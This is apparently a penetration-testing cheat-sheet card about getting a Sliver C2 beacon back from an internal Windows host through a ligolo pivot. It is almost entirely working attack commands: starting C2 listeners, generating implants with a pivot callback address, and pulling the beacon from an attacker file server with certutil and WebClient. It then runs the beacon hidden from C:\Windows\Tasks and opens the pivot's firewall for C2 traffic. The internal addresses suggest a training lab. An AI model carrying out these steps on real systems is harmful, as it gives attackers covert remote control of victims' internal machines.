title: C2 Callback Through Ligolo — Getting a Beacon Back from an Internal Box
body:
You have a shell on an internal box (evil-winrm, psexec, etc.) and want to land a Sliver beacon on it — but the internal box has no route to Kali. Its default gateway is your pivot box (e.g. WEB02 at 172.16.x.254), not the VPN. A beacon with Kali's tun0 IP baked in will silently fail every time.

The fix is two listeners in sequence, working together:

  1. A Sliver C2 listener on Kali bound to 127.0.0.1:<port> — the tunnel endpoint
  2. A ligolo listener_add on the pivot session — dumb TCP pipe from pivot-box:<port> → 127.0.0.1:<port> on Kali

The beacon's callback address is the PIVOT BOX's internal IP + the listener port, NOT Kali's IP.

Sliver jobs do NOT persist across client restarts — if you closed the client, the job is gone and must be restarted manually. Ligolo listeners also reset if the session dropped. Always verify the full chain is live before running the implant.

listener_add (ligolo) vs pivots tcp (Sliver native):
  listener_add — use when you already have a ligolo tunnel; works for any tool, not just Sliver; simpler, no beacon dependency
  pivots tcp   — use when you want Sliver to handle chaining natively; second beacon rides the first beacon's channel; no ligolo required but needs a live Sliver session on Pivot1
cmd:
# ══════════════════════════════════════════════════
# JOB RECOVERY — Sliver closed, need to reopen listener
# ══════════════════════════════════════════════════
# Sliver jobs don't persist across client restarts — always check first:
jobs
# If empty or missing your listener, just re-run it:
mtls -L 127.0.0.1 -l 9001
# or HTTP:
http -L 127.0.0.1 -l 9001
# Same command, same port — no special recovery needed
# Also re-check ligolo: listener_list (may have reset if session dropped)

# ══════════════════════════════════════════════════
# PRE-FLIGHT — Verify full chain BEFORE running implant
# ══════════════════════════════════════════════════
# All three legs must be live or the beacon silently fails:

# Leg 1 — Sliver listener on Kali:
jobs
# Must show: 127.0.0.1:9001  (NOT 0.0.0.0 — only tunnel delivers to it)

# Leg 2 — Ligolo pipe on pivot session:
# (in ligolo proxy console — select pivot session)
# listener_list
# Must show listener on 0.0.0.0:9001 → 127.0.0.1:9001

# Leg 3 — Internal box can reach pivot on that port:
# (from evil-winrm / shell on internal box)
Test-NetConnection <pivot-internal-ip> -Port 9001
# TcpTestSucceeded : True  →  chain is complete, run the beacon
# TcpTestSucceeded : False →  firewall on pivot blocking that port
#                             netsh advfirewall show allprofiles (on pivot)

# ══════════════════════════════════════════════════
# STEP 1 — START SLIVER LISTENER FIRST
# ══════════════════════════════════════════════════
mtls -L 127.0.0.1 -l 9001
jobs    # confirm before anything else

# ══════════════════════════════════════════════════
# STEP 2 — ADD LIGOLO LISTENER ON PIVOT SESSION
# ══════════════════════════════════════════════════
# In ligolo proxy console — select pivot session (e.g. WEB02):
session
# pick WEB02
listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001 --tcp
listener_list    # confirm active

# Chain: beacon → 172.16.x.254:9001 (pivot) → tunnel → 127.0.0.1:9001 (Sliver)

# ══════════════════════════════════════════════════
# STEP 3 — GENERATE IMPLANT WITH PIVOT'S INTERNAL IP
# ══════════════════════════════════════════════════
# Callback = PIVOT's internal IP, never Kali's tun0:
generate --mtls <pivot-internal-ip>:9001 --os windows --arch amd64 --format exe --save internal_beacon.exe
# HTTP:
generate --http <pivot-internal-ip>:9001 --os windows --arch amd64 --format exe --save internal_beacon.exe

# ══════════════════════════════════════════════════
# STEP 4 — SERVE FILES TO INTERNAL BOX
# (internal box can't reach Kali's HTTP server directly)
# ══════════════════════════════════════════════════
# On Kali — start a python file server:
cd /home/kali && python3 -m http.server 8888

# In ligolo — expose it through the pivot (separate port from C2):
# select pivot session:
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888 --tcp
# Now the internal box can pull files from the pivot's internal IP:
# (from internal box shell / evil-winrm)
# (New-Object Net.WebClient).DownloadFile('http://<pivot-ip>:8888/internal_beacon.exe','C:\Windows\Tasks\beacon.exe')
# or certutil:
certutil -urlcache -split -f http://<pivot-ip>:8888/internal_beacon.exe C:\Windows\Tasks\beacon.exe

# ══════════════════════════════════════════════════
# STEP 5 — DELIVER AND EXECUTE
# ══════════════════════════════════════════════════
# From evil-winrm (upload built-in):
upload /home/kali/internal_beacon.exe C:\Windows\Tasks\beacon.exe
Start-Process C:\Windows\Tasks\beacon.exe -WindowStyle Hidden

# From Sliver session on pivot:
cd C:\Windows\Tasks
upload /home/kali/internal_beacon.exe
shell
Start-Process C:\Windows\Tasks\beacon.exe -WindowStyle Hidden
exit

# ══════════════════════════════════════════════════
# STEP 6 — WATCH FOR SESSION
# ══════════════════════════════════════════════════
sessions
# New session from internal box hostname should appear within jitter window
# If nothing after 30s — run pre-flight checks above

# ══════════════════════════════════════════════════
# ALTERNATIVE — Sliver native pivots tcp (no ligolo needed)
# Use when: you have an active Sliver SESSION on the pivot box
# (not just a beacon — sessions are interactive, beacons are async)
# ══════════════════════════════════════════════════
# In Sliver — select the PIVOT session:
use <pivot-session-id>
pivots tcp --bind 0.0.0.0:9898
pivots    # confirm listening

# Generate second implant pointing at pivot's tcp pivot port:
generate --tcp-pivot <pivot-internal-ip>:9898 --os windows --arch amd64 --format exe --save pivot2_beacon.exe

# Deliver and run on internal box — beacon rides:
# internal box → pivot tcp pivot :9898 → Sliver (no ligolo listener_add needed)

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# 'connection refused' in ligolo log:
#   → Sliver job on 127.0.0.1:9001 not running — restart it (Step 1)

# No session after 30s, no ligolo errors:
#   → Protocol mismatch — implant built as mtls but listener is http
#   → Check: implants (shows what was baked in) vs jobs (what's listening)
#   → Regenerate with matching protocol

# listener_add works but Test-NetConnection fails from internal box:
#   → Windows firewall on pivot blocking inbound on that port
#   → netsh advfirewall firewall add rule name=C2 protocol=TCP dir=in localport=9001 action=allow

# Port already in use on Kali:
#   → jobs -k <id> to kill the old listener, then restart on same port
#   → or pick a new port — keep all three in sync:
#      Sliver -l PORT = ligolo --to 127.0.0.1:PORT = implant callback PORT
warn: All three port numbers must match: Sliver listener (-l PORT), ligolo --to 127.0.0.1:PORT, and the implant callback port — mismatch any one and you get silent failure. Sliver jobs do NOT persist when you close the client — always run 'jobs' first and restart if empty. Start the Sliver job BEFORE the beacon executes — a beacon that gets refused once backs off with a long jitter timer, and you may wait minutes for the next retry. The implant callback is the PIVOT BOX's internal IP, never Kali's tun0 IP. Use a separate ligolo listener port for the file server (8888) vs the C2 (9001) — don't mix them.

choices.label: Got a beacon — now loot the internal box
Need to set up the initial ligolo tunnel first
Need a double pivot (third network beyond internal box)
